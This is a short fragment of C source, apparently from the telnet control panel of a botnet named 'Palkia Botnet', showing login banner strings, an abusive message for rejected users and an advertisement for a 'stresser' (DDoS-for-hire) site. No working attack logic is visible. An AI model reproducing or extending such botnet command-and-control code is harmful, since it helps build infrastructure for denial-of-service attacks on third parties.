...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "\x1b[31m*          GTFO MY NET BITCH :)        *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
		...
		sprintf(line1, "\x1b[31mWelcome, %s To The Palkia Botnet\r\n", accounts[find_line].id);
		sprintf(line2, "\x1b[31mCreated And Written By ~B1NARY~\r\n");
		sprintf(line3, "\x1b[31mwww.palkiastresser.xyz coming soon\r\n");
